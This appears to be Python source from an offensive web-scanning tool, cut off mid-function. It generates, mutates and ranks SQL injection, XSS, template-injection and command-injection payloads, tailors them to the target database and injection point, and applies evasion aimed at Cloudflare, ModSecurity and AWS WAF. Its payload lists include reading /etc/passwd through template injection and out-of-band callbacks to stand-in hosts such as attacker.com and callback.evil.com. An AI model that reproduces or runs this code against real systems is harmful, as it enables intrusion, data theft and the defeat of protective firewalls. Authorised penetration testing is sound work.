"""
Unified Payload Manager with Dynamic Generation Integration
===========================================================
Enhanced version that deeply integrates DynamicPayloadEngine for context-aware,
grammar-based fuzzing and mutation capabilities.
"""

import re
import base64
import json
import random
import string
import urllib.parse
import numpy as np
import hashlib
from typing import Dict, List, Optional, Tuple, Any, Union
from dataclasses import dataclass, field, asdict
from datetime import datetime
from urllib.parse import urlparse, urljoin
from packaging import version
from packaging.specifiers import SpecifierSet
from collections import defaultdict
import itertools
import logging

# Import only what we need from vulnerability_kb and fingerprinter
from .vulnerability_kb import (
    VulnerabilityKnowledgeBase,
    VulnPayload,
    VulnCategory
)
from .fingerprinter import TargetFingerprint

# Try to import enhanced components
try:
    from .enhanced.dynamic_payload_generator import DynamicPayloadEngine
    DYNAMIC_ENGINE_AVAILABLE = True
except ImportError:
    DYNAMIC_ENGINE_AVAILABLE = False
    # Create stub if not available
    class DynamicPayloadEngine:
        def generate_payload_variants(self, **kwargs):
            return []

logger = logging.getLogger(__name__)

# ============================================================================
# DATA CLASSES
# ============================================================================

@dataclass
class PayloadContext:
    """Enhanced context information for payload adaptation"""
    target_url: str
    parameter_name: Optional[str] = None
    injection_context: str = "parameter"  # parameter, header, path, body, cookie
    quote_context: str = "none"  # single, double, none, backtick
    database_type: Optional[str] = None
    encoding_required: List[str] = None
    waf_detected: Optional[str] = None
    
    # Attacker infrastructure
    attacker_domain: Optional[str] = None
    collaborator_url: Optional[str] = None
    callback_host: Optional[str] = None
    
    # Target specifics
    object_id: Optional[str] = None
    user_id: Optional[str] = None
    session_token: Optional[str] = None
    
    # Enhanced context for dynamic generation
    technology_stack: List[str] = field(default_factory=list)
    server_version: Optional[str] = None
    response_patterns: List[str] = field(default_factory=list)
    filter_patterns: List[str] = field(default_factory=list)
    max_payload_length: int = 8192
    request_method: str = "GET"
    content_type: str = "application/x-www-form-urlencoded"

@dataclass
class PayloadScore:
    """Enhanced scoring components for payload ranking"""
    version_match: float = 0.0
    pattern_match: float = 0.0
    confidence_base: float = 0.0
    tag_match: float = 0.0
    context_match: float = 0.0
    historical_success: float = 0.0
    dynamic_score: float = 0.0  # Score for dynamically generated payloads
    mutation_score: float = 0.0  # Score based on mutation success
    evasion_score: float = 0.0   # WAF evasion score
    total: float = 0.0
    
    def calculate_total(self, weights: Dict[str, float]) -> float:
        """Calculate weighted total score"""
        self.total = (
            self.version_match * weights.get('version', 0.25) +
            self.pattern_match * weights.get('pattern', 0.15) +
            self.confidence_base * weights.get('confidence', 0.15) +
            self.tag_match * weights.get('tag', 0.05) +
            self.context_match * weights.get('context', 0.1) +
            self.historical_success * weights.get('history', 0.1) +
            self.dynamic_score * weights.get('dynamic', 0.1) +
            self.mutation_score * weights.get('mutation', 0.05) +
            self.evasion_score * weights.get('evasion', 0.05)
        )
        return self.total

@dataclass
class RankedPayload:
    """Enhanced payload with ranking and metadata"""
    payload: str  # The actual payload string
    metadata: Optional[Union[VulnPayload, Dict]] = None  # KB or dynamic metadata
    score: PayloadScore = field(default_factory=PayloadScore)
    rank: int = 0
    reasoning: List[str] = field(default_factory=list)
    category: str = ""
    name: str = ""
    source: str = "static"  # static, generated, mutated, grammar
    mutation_history: List[str] = field(default_factory=list)
    evasion_techniques: List[str] = field(default_factory=list)
    test_results: Dict[str, Any] = field(default_factory=dict)

# ============================================================================
# GRAMMAR-BASED PAYLOAD GENERATOR
# ============================================================================

class GrammarBasedGenerator:
    """Grammar-based payload generation for structured fuzzing"""
    
    def __init__(self):
        self.grammars = self._initialize_grammars()
        self.terminals = self._initialize_terminals()
    
    def _initialize_grammars(self) -> Dict[str, Dict]:
        """Initialize context-free grammars for different vulnerability types"""
        return {
            'sqli': {
                'start': ['<statement>'],
                'statement': ['<union_based>', '<boolean_based>', '<time_based>', '<error_based>'],
                'union_based': ["' UNION SELECT <columns> FROM <table> <comment>"],
                'boolean_based': ["' <logic> <condition> <comment>"],
                'time_based': ["' <logic> <sleep_func> <comment>"],
                'error_based': ["' <logic> <error_func> <comment>"],
                'columns': ['NULL', 'NULL,NULL', 'NULL,NULL,NULL', '<number>', '<string>'],
                'table': ['users', 'information_schema.tables', 'mysql.user', 'dual'],
                'logic': ['AND', 'OR', '&&', '||'],
                'condition': ["'1'='1'", "1=1", "true", "<comparison>"],
                'comparison': ["LENGTH(<field>)><number>", "ASCII(SUBSTRING(<field>,1,1))><number>"],
                'field': ['password', 'username', 'version()', '@@version'],
                'sleep_func': ['SLEEP(<time>)', 'BENCHMARK(<iterations>,MD5(1))', 'pg_sleep(<time>)'],
                'error_func': ['extractvalue(1,<xpath>)', 'updatexml(1,<xpath>,1)'],
                'xpath': ['concat(0x7e,version(),0x7e)', 'concat(0x7e,database(),0x7e)'],
                'comment': ['--', '#', '-- -', '/**/'],
                'number': ['1', '2', '5', '10', '100'],
                'string': ["'admin'", "'test'", "char(97,100,109,105,110)"],
                'time': ['5', '10', '15'],
                'iterations': ['1000000', '5000000', '10000000']
            },
            'xss': {
                'start': ['<xss_payload>'],
                'xss_payload': ['<script_tag>', '<event_handler>', '<javascript_uri>', '<data_uri>'],
                'script_tag': ['<script><alert_func></script>', '<script <attributes>><alert_func></script>'],
                'event_handler': ['<event>=<alert_func>', '<event>="<alert_func>"'],
                'javascript_uri': ['javascript:<alert_func>', 'javascript://%0A<alert_func>'],
                'data_uri': ['data:text/html,<script><alert_func></script>'],
                'event': ['onerror', 'onload', 'onclick', 'onmouseover', 'onfocus'],
                'alert_func': ['alert(<message>)', 'prompt(<message>)', 'confirm(<message>)',
                              'eval(String.fromCharCode(<char_codes>))'],
                'attributes': ['src=x', 'type="text/javascript"'],
                'message': ['1', '"XSS"', 'document.cookie', 'document.domain'],
                'char_codes': ['88,83,83', '97,108,101,114,116,40,49,41']
            },
            'ssti': {
                'start': ['<template_injection>'],
                'template_injection': ['<jinja2>', '<freemarker>', '<velocity>', '<detection>'],
                'jinja2': ['{{<jinja_expr>}}', '{%<jinja_stmt>%}'],
                'jinja_expr': ['<arithmetic>', '<object_access>', '<function_call>'],
                'jinja_stmt': ['if <condition>', 'for <var> in <iterable>'],
                'freemarker': ['${<freemarker_expr>}', '<#<freemarker_directive>>'],
                'velocity': ['#set($<var>=<value>)', '$<velocity_ref>'],
                'detection': ['{{<number>*<number>}}', '${<number>*<number>}'],
                'arithmetic': ['<number>+<number>', '<number>*<number>'],
                'object_access': ['request.<attr>', 'config.<attr>', '__class__.__init__.__globals__'],
                'function_call': ['<func>(<args>)', '__import__("os").popen("<cmd>").read()'],
                'attr': ['application', 'args', '__class__'],
                'func': ['print', 'exec', 'eval', '__import__'],
                'args': ['"id"', '"whoami"', '1'],
                'cmd': ['id', 'whoami', 'ls', 'cat /etc/passwd'],
                'number': ['7', '49', '343'],
                'var': ['x', 'i', 'item'],
                'value': ['1', '"test"', 'request.args.get("param")'],
                'iterable': ['range(10)', 'items', 'config.items()']
            }
        }
    
    def _initialize_terminals(self) -> Dict[str, List[str]]:
        """Initialize terminal symbols for grammar expansion"""
        return {
            'number': [str(i) for i in range(1, 101)],
            'string': ['admin', 'test', 'user', 'root', 'guest'],
            'char': list(string.ascii_letters + string.digits),
            'special': ['!', '@', '#', '$', '%', '^', '&', '*', '(', ')']
        }
    
    def generate_from_grammar(self, vuln_type: str, max_depth: int = 5, 
                             count: int = 10) -> List[str]:
        """Generate payloads using grammar-based approach"""
        if vuln_type not in self.grammars:
            return []
        
        grammar = self.grammars[vuln_type]
        payloads = []
        
        for _ in range(count):
            try:
                payload = self._expand_grammar(grammar, 'start', max_depth)
                if payload and payload not in payloads:
                    payloads.append(payload)
            except RecursionError:
                continue
        
        return payloads
    
    def _expand_grammar(self, grammar: Dict, symbol: str, depth: int) -> str:
        """Recursively expand grammar rules"""
        if depth <= 0:
            return symbol
        
        # Handle terminal symbols
        if not symbol.startswith('<') or not symbol.endswith('>'):
            return symbol
        
        rule_name = symbol[1:-1]
        
        # Check if it's a terminal from our terminal list
        if rule_name in self.terminals:
            return random.choice(self.terminals[rule_name])
        
        # Get production rules
        if rule_name not in grammar:
            return symbol
        
        productions = grammar[rule_name]
        if not productions:
            return symbol
        
        # Choose random production
        production = random.choice(productions)
        
        # Expand non-terminals in production
        result = production
        non_terminals = re.findall(r'<[^>]+>', production)
        
        for non_terminal in non_terminals:
            expansion = self._expand_grammar(grammar, non_terminal, depth - 1)
            result = result.replace(non_terminal, expansion, 1)
        
        return result

# ============================================================================
# ENHANCED PAYLOAD GENERATOR
# ============================================================================

class EnhancedPayloadGenerator:
    """Enhanced payload generator with mutation and grammar support"""
    
    def __init__(self):
        self.grammar_generator = GrammarBasedGenerator()
        self.mutation_operators = self._init_mutation_operators()
        self.evasion_techniques = self._init_evasion_techniques()
    
    def _init_mutation_operators(self) -> Dict[str, callable]:
        """Initialize mutation operators for payload transformation"""
        return {
            'case_swap': self._mutate_case_swap,
            'char_encode': self._mutate_char_encode,
            'comment_inject': self._mutate_comment_inject,
            'space_substitute': self._mutate_space_substitute,
            'keyword_split': self._mutate_keyword_split,
            'double_encode': self._mutate_double_encode,
            'unicode_encode': self._mutate_unicode_encode
        }
    
    def _init_evasion_techniques(self) -> Dict[str, callable]:
        """Initialize WAF evasion techniques"""
        return {
            'cloudflare': self._evade_cloudflare,
            'modsecurity': self._evade_modsecurity,
            'aws_waf': self._evade_aws_waf,
            'generic': self._evade_generic
        }
    
    def generate(self, vuln_type: str, context: PayloadContext, 
                count: int = 20) -> List[Dict]:
        """Generate enhanced payloads with multiple techniques"""
        payloads = []
        
        # Grammar-based generation
        grammar_payloads = self.grammar_generator.generate_from_grammar(
            vuln_type.lower(), count=count // 2
        )
        
        for payload in grammar_payloads:
            payloads.append({
                'payload': payload,
                'source': 'grammar',
                'technique': 'grammar_expansion',
                'confidence': 0.7
            })
        
        # Standard payloads with mutations
        base_payloads = self._get_base_payloads(vuln_type)
        
        for base in base_payloads[:count // 4]:
            # Apply mutations
            mutated = self._apply_mutations(base, context)
            for mutation in mutated:
                payloads.append({
                    'payload': mutation['payload'],
                    'source': 'mutated',
                    'technique': mutation['technique'],
                    'confidence': 0.6,
                    'base_payload': base
                })
        
        # WAF evasion variants if WAF detected
        if context.waf_detected:
            evasion_payloads = self._generate_evasion_variants(
                base_payloads[:5], context.waf_detected
            )
            payloads.extend(evasion_payloads)
        
        return payloads[:count]
    
    def _get_base_payloads(self, vuln_type: str) -> List[str]:
        """Get base payloads for mutation"""
        base_payloads = {
            'xss': [
                '<script>alert(1)</script>',
                '"><script>alert(1)</script>',
                'javascript:alert(1)',
                '<img src=x onerror=alert(1)>',
                '<svg onload=alert(1)>'
            ],
            'sqli': [
                "' OR '1'='1",
                "' UNION SELECT NULL--",
                "1' AND SLEEP(5)--",
                "' AND 1=1--",
                "admin'--"
            ],
            'ssti': [
                '{{7*7}}',
                '${7*7}',
                '{{config}}',
                '{{request.application.__globals__}}'
            ],
            'rce': [
                '; ls',
                '| whoami',
                '`id`',
                '$(whoami)',
                '; nslookup attacker.com'
            ]
        }
        
        return base_payloads.get(vuln_type.lower(), [])
    
    def _apply_mutations(self, payload: str, context: PayloadContext) -> List[Dict]:
        """Apply various mutations to a payload"""
        mutations = []
        
        # Apply each mutation operator
        for technique, operator in self.mutation_operators.items():
            try:
                mutated = operator(payload, context)
                if mutated != payload:
                    mutations.append({
                        'payload': mutated,
                        'technique': technique
                    })
            except:
                continue
        
        return mutations
    
    def _mutate_case_swap(self, payload: str, context: PayloadContext) -> str:
        """Randomly swap case of characters"""
        return ''.join(c.swapcase() if random.random() > 0.5 else c for c in payload)
    
    def _mutate_char_encode(self, payload: str, context: PayloadContext) -> str:
        """Encode random characters"""
        result = []
        for char in payload:
            if random.random() > 0.7 and char.isalpha():
                result.append(f'&#{ord(char)};')
            else:
                result.append(char)
        return ''.join(result)
    
    def _mutate_comment_inject(self, payload: str, context: PayloadContext) -> str:
        """Inject comments to break patterns"""
        keywords = ['SELECT', 'UNION', 'script', 'alert', 'FROM']
        result = payload
        
        for keyword in keywords:
            if keyword in result:
                result = result.replace(keyword, f'{keyword[:len(keyword)//2]}/**/{ keyword[len(keyword)//2:]}')
        
        return result
    
    def _mutate_space_substitute(self, payload: str, context: PayloadContext) -> str:
        """Substitute spaces with alternatives"""
        substitutes = ['/**/','%20','+','%09','%0a','%0d']
        return payload.replace(' ', random.choice(substitutes))
    
    def _mutate_keyword_split(self, payload: str, context: PayloadContext) -> str:
        """Split keywords with special characters"""
        keywords = ['SELECT', 'UNION', 'INSERT', 'UPDATE', 'DELETE', 'script', 'alert']
        result = payload
        
        for keyword in keywords:
            if keyword.lower() in result.lower():
                split_pos = len(keyword) // 2
                replacement = f"{keyword[:split_pos]}/*comment*/{keyword[split_pos:]}"
                result = re.sub(keyword, replacement, result, flags=re.IGNORECASE)
        
        return result
    
    def _mutate_double_encode(self, payload: str, context: PayloadContext) -> str:
        """Double URL encode the payload"""
        return urllib.parse.quote(urllib.parse.quote(payload))
    
    def _mutate_unicode_encode(self, payload: str, context: PayloadContext) -> str:
        """Unicode encode characters"""
        result = []
        for char in payload:
            if random.random() > 0.6 and char.isalpha():
                result.append(f'\\u{ord(char):04x}')
            else:
                result.append(char)
        return ''.join(result)
    
    def _generate_evasion_variants(self, payloads: List[str], waf_type: str) -> List[Dict]:
        """Generate WAF-specific evasion variants"""
        variants = []
        technique = self.evasion_techniques.get(waf_type.lower(), self._evade_generic)
        
        for payload in payloads:
            evaded = technique(payload)
            if evaded != payload:
                variants.append({
                    'payload': evaded,
                    'source': 'evasion',
                    'technique': f'{waf_type}_evasion',
                    'confidence': 0.65
                })
        
        return variants
    
    def _evade_cloudflare(self, payload: str) -> str:
        """Cloudflare-specific evasion"""
        # Mix case and add null bytes
        result = self._mutate_case_swap(payload, None)
        result = result.replace('<', '%00<')
        return result
    
    def _evade_modsecurity(self, payload: str) -> str:
        """ModSecurity-specific evasion"""
        # Use comment injection and encoding
        result = self._mutate_comment_inject(payload, None)
        result = self._mutate_char_encode(result, None)
        return result
    
    def _evade_aws_waf(self, payload: str) -> str:
        """AWS WAF-specific evasion"""
        # Use Unicode and double encoding
        result = self._mutate_unicode_encode(payload, None)
        if len(result) < 100:  # AWS has size limits
            result = self._mutate_double_encode(result, None)
        return result
    
    def _evade_generic(self, payload: str) -> str:
        """Generic WAF evasion"""
        techniques = [
            self._mutate_case_swap,
            self._mutate_space_substitute,
            self._mutate_keyword_split
        ]
        
        result = payload
        for technique in random.sample(techniques, 2):
            result = technique(result, None)
        
        return result

# ============================================================================
# PAYLOAD ADAPTER
# ============================================================================

class PayloadAdapter:
    """Enhanced payload adapter with dynamic context handling"""
    
    def __init__(self):
        self.global_replacements = {
            'ATTACKER_DOMAIN': 'attacker_domain',
            'COLLABORATOR_URL': 'collaborator_url',
            'CALLBACK_HOST': 'callback_host',
            'TARGET_HOST': 'target_host',
            'TARGET_ORIGIN': 'target_origin',
            'TARGET_PATH': 'target_path',
            'PARAM': 'parameter_name',
            'ID': 'object_id',
            'OBJECT_ID': 'object_id',
            'USER_ID': 'user_id',
            'CMD': 'command',
            'SESSION': 'session_token'
        }
        
        self.db_adaptations = {
            'mysql': {
                'sleep_function': 'SLEEP(5)',
                'version_function': '@@version',
                'comment_syntax': '-- ',
                'concat_function': 'CONCAT',
                'string_escape': '\\'
            },
            'postgresql': {
                'sleep_function': 'pg_sleep(5)',
                'version_function': 'version()',
                'comment_syntax': '-- ',
                'concat_function': '||',
                'string_escape': '\''
            },
            'mssql': {
                'sleep_function': "WAITFOR DELAY '0:0:5'",
                'version_function': '@@version',
                'comment_syntax': '-- ',
                'concat_function': '+',
                'string_escape': '\''
            },
            'oracle': {
                'sleep_function': 'DBMS_LOCK.SLEEP(5)',
                'version_function': 'SELECT * FROM v$version',
                'comment_syntax': '-- ',
                'concat_function': '||',
                'string_escape': '\''
            },
            'sqlite': {
                'sleep_function': 'randomblob(100000000)',
                'version_function': 'sqlite_version()',
                'comment_syntax': '-- ',
                'concat_function': '||',
                'string_escape': '\''
            }
        }
    
    def adapt_payload(self, payload: str, context: PayloadContext, 
                     fingerprint: Optional[TargetFingerprint] = None) -> str:
        """Enhanced payload adaptation with dynamic context"""
        adapted = payload
        
        # Extract target information
        parsed_url = urlparse(context.target_url)
        target_host = parsed_url.netloc
        target_origin = f"{parsed_url.scheme}://{parsed_url.netloc}"
        target_path = parsed_url.path or "/"
        
        # Build comprehensive replacements
        replacements = {
            'attacker_domain': context.attacker_domain or 'attacker.com',
            'collaborator_url': context.collaborator_url or 'https://collab.oast.site',
            'callback_host': context.callback_host or 'callback.evil.com',
            'target_host': target_host,
            'target_origin': target_origin,
            'target_path': target_path,
            'parameter_name': context.parameter_name or 'id',
            'object_id': context.object_id or '1',
            'user_id': context.user_id or '1',
            'command': 'nslookup ' + (context.collaborator_url or 'test.oast.site'),
            'session_token': context.session_token or 'fake_session'
        }
        
        # Perform global replacements
        for placeholder, context_key in self.global_replacements.items():
            if placeholder in adapted and context_key in replacements:
                adapted = adapted.replace(placeholder, str(replacements[context_key]))
        
        # Apply vulnerability-specific adaptations
        adapted = self._adapt_by_vulnerability_type(adapted, context, fingerprint)
        
        # Apply injection context adaptations
        adapted = self._adapt_by_injection_context(adapted, context)
        
        # Apply encoding if required
        if context.encoding_required:
            adapted = self._apply_encoding(adapted, context.encoding_required)
        
        # Handle WAF evasion if detected
        if context.waf_detected:
            adapted = self._apply_waf_evasion(adapted, context.waf_detected)
        
        # Ensure payload fits size constraints
        if len(adapted) > context.max_payload_length:
            adapted = self._truncate_payload(adapted, context.max_payload_length)
        
        return adapted
    
    def _adapt_by_vulnerability_type(self, payload: str, context: PayloadContext,
                                   fingerprint: Optional[TargetFingerprint]) -> str:
        """Apply vulnerability-specific adaptations"""
        vuln_type = self._detect_vuln_type(payload)
        
        if vuln_type == 'SQLI':
            return self._adapt_sqli_payload(payload, context, fingerprint)
        elif vuln_type == 'XSS':
            return self._adapt_xss_payload(payload, context, fingerprint)
        elif vuln_type == 'SSTI':
            return self._adapt_ssti_payload(payload, context)
        elif vuln_type == 'RCE':
            return self._adapt_rce_payload(payload, context)
        
        return payload
    
    def _adapt_by_injection_context(self, payload: str, context: PayloadContext) -> str:
        """Adapt payload based on injection context"""
        if context.injection_context == 'header':
            # Headers need special handling
            payload = payload.replace('\n', '').replace('\r', '')
            
        elif context.injection_context == 'cookie':
            # Cookies have restrictions
            payload = urllib.parse.quote(payload, safe='')
            
        elif context.injection_context == 'path':
            # Path injection needs URL encoding
            payload = urllib.parse.quote(payload, safe='/')
            
        elif context.injection_context == 'body':
            # Body can depend on content type
            if context.content_type == 'application/json':
                payload = json.dumps(payload)[1:-1]  # Remove quotes
            elif context.content_type == 'application/xml':
                payload = payload.replace('&', '&amp;').replace('<', '&lt;')
        
        return payload
    
    def _detect_vuln_type(self, payload: str) -> str:
        """Detect vulnerability type from payload"""
        payload_lower = payload.lower()
        
        patterns = {
            'SQLI': ['union', 'select', 'sleep(', 'waitfor', 'benchmark', 'pg_sleep'],
            'XSS': ['<script', 'onerror', 'onload', 'alert(', 'javascript:', '<svg'],
            'SSRF': ['http://', 'https://', 'gopher://', 'file://', 'dict://'],
            'RCE': ['&&', ';', '`', '$(', '|', 'exec(', 'system('],
            'SSTI': ['{{', '${', '<%', '{%', '#{']
        }
        
        for vuln_type, keywords in patterns.items():
            if any(kw in payload_lower for kw in keywords):
                return vuln_type
        
        return 'UNKNOWN'
    
    def _adapt_sqli_payload(self, payload: str, context: PayloadContext,
                           fingerprint: Optional[TargetFingerprint]) -> str:
        """Enhanced SQL injection payload adaptation"""
        adapted = payload
        
        # Determine database type
        db_type = context.database_type
        
        if not db_type and fingerprint:
            # Try to infer from fingerprint
            tech_stack = fingerprint.technologies or []
            if 'MySQL' in str(tech_stack):
                db_type = 'mysql'
            elif 'PostgreSQL' in str(tech_stack):
                db_type = 'postgresql'
            elif 'Microsoft SQL' in str(tech_stack):
                db_type = 'mssql'
        
        db_type = db_type or 'mysql'  # Default
        
        if db_type in self.db_adaptations:
            db_config = self.db_adaptations[db_type]
            
            # Replace sleep functions
            sleep_patterns = ['SLEEP\\(\\d+\\)', 'pg_sleep\\(\\d+\\)', 'WAITFOR DELAY']
            for pattern in sleep_patterns:
                adapted = re.sub(pattern, db_config['sleep_function'], adapted, flags=re.I)
            
            # Replace version functions
            adapted = re.sub(r'@@version', db_config['version_function'], adapted)
            
            # Handle concatenation
            if '||' in adapted and db_type == 'mysql':
                adapted = adapted.replace('||', db_config['concat_function'])
        
        # Handle quote context
        if context.quote_context == 'single':
            adapted = f"'{adapted}"
        elif context.quote_context == 'double':
            adapted = f'"{adapted}'
        elif context.quote_context == 'backtick':
            adapted = f'`{adapted}'
        
        return adapted
    
    def _adapt_xss_payload(self, payload: str, context: PayloadContext,
                          fingerprint: Optional[TargetFingerprint]) -> str:
        """Enhanced XSS payload adaptation"""
        adapted = payload
        
        # Replace with actual attacker infrastructure
        if context.attacker_domain:
            adapted = re.sub(r'https?://[^/\s"\']+', context.attacker_domain, adapted)
        
        # Handle different injection contexts
        if context.injection_context == 'attribute':
            if context.quote_context == 'single':
                adapted = f"' {adapted} '"
            elif context.quote_context == 'double':
                adapted = f'" {adapted} "'
            elif context.quote_context == 'none':
                adapted = f' {adapted} '
        
        # Add context breakers if needed
        if '"><' in adapted or "'><" in adapted:
            # Already has breakers
            pass
        elif context.quote_context:
            breaker = '">' if context.quote_context == 'double' else "'>"
            adapted = breaker + adapted
        
        return adapted
    
    def _adapt_ssti_payload(self, payload: str, context: PayloadContext) -> str:
        """Adapt SSTI payloads"""
        # Detect template engine from technology stack
        engine = None
        if context.technology_stack:
            stack_str = ' '.join(context.technology_stack).lower()
            if 'jinja' in stack_str:
                engine = 'jinja2'
            elif 'twig' in stack_str:
                engine = 'twig'
            elif 'freemarker' in stack_str:
                engine = 'freemarker'
        
        # Apply engine-specific adaptations
        if engine == 'jinja2' and '{{' not in payload:
            payload = '{{' + payload + '}}'
        
        return payload
    
    def _adapt_rce_payload(self, payload: str, context: PayloadContext) -> str:
        """Adapt RCE payloads"""
        # Add callback commands if collaborator available
        if context.collaborator_url and 'nslookup' not in payload.lower():
            payload = f"{payload} ; nslookup {urlparse(context.collaborator_url).netloc}"
        
        return payload
    
    def _apply_encoding(self, payload: str, encodings: List[str]) -> str:
        """Apply multiple encoding layers"""
        encoded = payload
        
        for encoding in encodings:
            if encoding == 'url':
                encoded = urllib.parse.quote(encoded)
            elif encoding == 'double_url':
                encoded = urllib.parse.quote(urllib.parse.quote(encoded))
            elif encoding == 'base64':
                encoded = base64.b64encode(encoded.encode()).decode()
            elif encoding == 'html':
                encoded = ''.join(f'&#{ord(c)};' for c in encoded)
            elif encoding == 'unicode':
                encoded = ''.join(f'\\u{ord(c):04x}' if ord(c) < 128 else c for c in encoded)
        
        return encoded
    
    def _apply_waf_evasion(self, payload: str, waf_type: str) -> str:
        """Apply WAF-specific evasion techniques"""
        evasion_rules = {
            'cloudflare': [
                ('SELECT', 'SeLeCt'),
                ('UNION', 'UnIoN'),
                ('<script>', '<ScRiPt>'),
                ('alert', 'AlErT')
            ],
            'modsecurity': [
                ('SELECT', 'SE/**/LECT'),
                ('UNION', 'UN/**/ION'),
                (' ', '/**/'),
                ('=', 'LIKE')
            ],
            'aws_waf': [
                ('script', 'scr\\x69pt'),
                ('SELECT', 'SEL%45CT'),
                ('UNION', 'UNI%4FN'),
                (' ', '%20')
            ]
        }
        
        rules = evasion_rules.get(waf_type.lower(), [])
        for pattern, replacement in rules:
            payload = payload.replace(pattern, replacement)
        
        return payload
    
    def _truncate_payload(self, payload: str, max_length: int) -> str:
        """Intelligently truncate payload to fit size constraints"""
        if len(payload) <= max_length:
            return payload
        
        # Try to preserve payload structure
        if '>' in payload and '</' in payload:
            # XML/HTML - try to close tags
            truncated = payload[:max_length-10] + '></>'
        elif '--' in payload or '#' in payload:
            # SQL - preserve comment
            truncated = payload[:max_length-3] + '--'
        else:
            truncated = payload[:max_length]
        
        return truncated

# ============================================================================
# PAYLOAD SCORER
# ============================================================================

class PayloadScorer:
    """Enhanced payload scoring with dynamic payload support"""
    
    def __init__(self, config: Optional[Dict] = None):
        self.config = config or self._default_config()
        self.history = defaultdict(lambda: {'attempts': 0, 'successes': 0})
        self.mutation_success = defaultdict(float)
    
    def _default_config(self) -> Dict:
        return {
            'weights': {
                'version': 0.25,
                'pattern': 0.15,
                'confidence': 0.15,
                'tag': 0.05,
                'context': 0.1,
                'history': 0.1,
                'dynamic': 0.1,
                'mutation': 0.05,
                'evasion': 0.05
            },
            'min_score': 0.3,
            'dynamic_bonus': 0.1,
            'grammar_bonus': 0.15
        }
    
    def score_payload(self, payload: Union[Dict, RankedPayload], 
                      fingerprint: TargetFingerprint,
                      context: Optional[PayloadContext]) -> PayloadScore:
        """Score a payload with enhanced scoring for dynamic payloads"""
        score = PayloadScore()
        
        # Handle different payload formats
        if isinstance(payload, RankedPayload):
            payload_dict = {
                'payload': payload.payload,
                'source': payload.source,
                'confidence': payload.score.confidence_base
            }
        else:
            payload_dict = payload
        
        # Version match
        if 'product' in payload_dict:
            score.version_match = self._score_version_match(payload_dict, fingerprint)
        else:
            score.version_match = 0.5
        
        # Confidence base
        score.confidence_base = payload_dict.get('confidence', 0.5)
        
        # Context match
        score.context_match = self._score_context_match(payload_dict, context)
        
        # Historical success
        payload_id = payload_dict.get('name', str(hash(payload_dict['payload'])))
        score.historical_success = self._get_historical_success(payload_id)
        
        # Dynamic payload scoring
        if payload_dict.get('source') in ['generated', 'dynamic', 'grammar']:
            score.dynamic_score = self.config['dynamic_bonus']
            
            if payload_dict.get('source') == 'grammar':
                score.dynamic_score += self.config['grammar_bonus']
        
        # Mutation scoring
        if payload_dict.get('source') == 'mutated':
            technique = payload_dict.get('technique', 'unknown')
            score.mutation_score = self.mutation_success.get(technique, 0.5)
        
        # Evasion scoring
        if payload_dict.get('source') == 'evasion' or context and context.waf_detected:
            score.evasion_score = 0.7 if payload_dict.get('technique') else 0.3
        
        # Calculate total
        score.calculate_total(self.config['weights'])
        
        return score
    
    def _score_version_match(self, payload: Dict, fingerprint: TargetFingerprint) -> float:
        """Score version compatibility"""
        payload_product = payload.get('product', '').lower()
        
        if not payload_product:
            return 0.5
        
        if fingerprint.product and payload_product == fingerprint.product.lower():
            return 1.0
        
        if any(payload_product in tech.lower() for tech in fingerprint.technologies):
            return 0.7
        
        return 0.2
    
    def _score_context_match(self, payload: Dict, context: Optional[PayloadContext]) -> float:
        """Enhanced context scoring"""
        if not context:
            return 0.5
        
        score = 0.5
        
        # Injection context match
        inj_context = context.injection_context
        payload_context = payload.get('injection_context', '')
        
        if inj_context and payload_context:
            if inj_context == payload_context:
                score += 0.3
            else:
                score -= 0.2
        
        # Technology stack match
        if context.technology_stack and 'technologies' in payload:
            overlap = set(context.technology_stack) & set(payload['technologies'])
            score += len(overlap) * 0.1
        
        # WAF consideration
        if context.waf_detected and payload.get('source') in ['evasion', 'mutated']:
            score += 0.2
        
        return min(1.0, max(0.0, score))
    
    def _get_historical_success(self, payload_id: str) -> float:
        """Get historical success rate"""
        stats = self.history[payload_id]
        if stats['attempts'] > 0:
            return stats['successes'] / stats['attempts']
        return 0.5
    
    def update_history(self, payload_id: str, success: bool, technique: str = None):
        """Update success history with technique tracking"""
        self.history[payload_id]['attempts'] += 1
        if success:
            self.history[payload_id]['successes'] += 1
        
        # Track mutation technique success
        if technique:
            current = self.mutation_success.get(technique, 0.5)
            if success:
                self.mutation_success[technique] = min(1.0, current + 0.05)
            else:
                self.mutation_success[technique] = max(0.0, current - 0.02)

# ============================================================================
# UNIFIED PAYLOAD MANAGER
# ============================================================================

class UnifiedPayloadManager:
    """
    Enhanced unified payload manager with deep dynamic payload integration
    """
    
    def __init__(self, kb_path: Optional[str] = None, config: Optional[Dict] = None):
        self.kb = VulnerabilityKnowledgeBase(kb_path) if kb_path else None
        self.enhanced_generator = EnhancedPayloadGenerator()
        self.adapter = PayloadAdapter()
        self.scorer = PayloadScorer(config)
        self.config = config or {}
        self.cache = {}
        self.fingerprint_cache = {}
        
        # Initialize DynamicPayloadEngine if available
        self.dynamic_engine = None
        if DYNAMIC_ENGINE_AVAILABLE:
            try:
                self.dynamic_engine = DynamicPayloadEngine()
                logger.info("DynamicPayloadEngine integrated successfully")
            except Exception as e:
                logger.warning(f"Could not initialize DynamicPayloadEngine: {e}")
        
        # Performance tracking
        self.generation_stats = defaultdict(lambda: {'generated': 0, 'successful': 0})
    
    def get_payloads_for_target(self,
                                target_url: str,
                                vulnerability_type: str,
                                fingerprint: Optional[TargetFingerprint] = None,
                                context: Optional[PayloadContext] = None,
                                top_n: int = 10,
                                include_generated: bool = True,
                                use_dynamic_engine: bool = True) -> List[RankedPayload]:
        """
        Enhanced payload selection with deep dynamic integration
        
        Args:
            target_url: Target URL
            vulnerability_type: Type of vulnerability
            fingerprint: Target fingerprint
            context: Payload context for adaptation
            top_n: Number of payloads to return
            include_generated: Include generated payloads
            use_dynamic_engine: Use DynamicPayloadEngine if available
            
        Returns:
            List of ranked payloads ready for use
        """
        all_payloads = []
        
        # Create enhanced context if not provided
        if not context:
            context = PayloadContext(
                target_url=target_url,
                technology_stack=fingerprint.technologies if fingerprint else [],
                server_version=fingerprint.version if fingerprint else None
            )
        
        # 1. Get KB payloads if available
        if self.kb:
            try:
                vuln_category = VulnCategory[vulnerability_type.upper()]
                kb_payloads = self.kb.get_payloads_by_category(vuln_category)
                
                for kbp in kb_payloads:
                    all_payloads.append({
                        'payload': kbp.payload,
                        'category': vulnerability_type,
                        'name': kbp.name,
                        'confidence': kbp.confidence_score,
                        'product': kbp.product,
                        'metadata': kbp,
                        'source': 'static'
                    })
            except (KeyError, AttributeError):
                pass
        
